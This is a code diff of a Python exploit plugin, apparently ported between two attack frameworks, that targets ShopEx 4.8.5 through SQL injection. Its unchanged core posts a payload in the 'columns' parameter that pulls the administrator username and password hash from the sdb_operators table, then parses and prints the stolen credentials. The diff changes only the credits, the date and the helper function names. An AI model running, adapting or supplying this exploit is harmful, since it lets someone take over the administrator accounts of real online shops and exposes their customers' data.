@@ -1,15 +1,11 @@
-
-# -*- coding: cp936 -*-
-'''
-Mst=>exploit=>plugin
-'''
-class mstplugin:
+# -*- coding: utf-8-*-
+class NSSPlugin:
     '''shopex_4.8.5_sqlInject'''
     infos = [
         ['插件','SHOPEX 4.8.5 SQL注入Exploit'],
-        ['作者','mst'],
-        ['更新','2013/10/22'],
-        ['网址','http://mstoor.duapp.com'],
+        ['作者','nss'],
+        ['更新','2014/07/14'],
+        ['网址','http://jadore.wang'],
         ]
     opts  = [
         ['RURL','localhost','目标URL'],
@@ -26,10 +22,10 @@ class mstplugin:
         poc     = '1,2,(SELECT concat(username,0x7c,userpass) FROM sdb_operators limit 0,1) as name'
         value   = {"columns":poc}
         try:
-            color.cprint("[+] Sending exp ..",YELLOW)
-            res= fuck.urlpost(url,value)
-            ok = fuck.find(r'\w+[|]+\w+',res.read())[0]
-            color.cprint("[*] Exploit Successful !",GREEN)
-            color.cprint("[*] %s"%ok,GREEN)
+            pp.prettyPrint("[+] Sending exp ..",YELLOW)
+            res = exploitModule.urlPOST(url,value)
+            ok = exploitModule.find(r'\w+[|]+\w+',res.read())[0]
+            pp.prettyPrint("[*] Exploit Successful !",GREEN)
+            pp.prettyPrint("[*] %s"%ok,GREEN)
         except Exception,e:
-            color.cprint("[!] Exploit False ! CODE:%s"%e,RED)
+            pp.prettyPrint("[!] Exploit False ! CODE:%s"%e,RED)
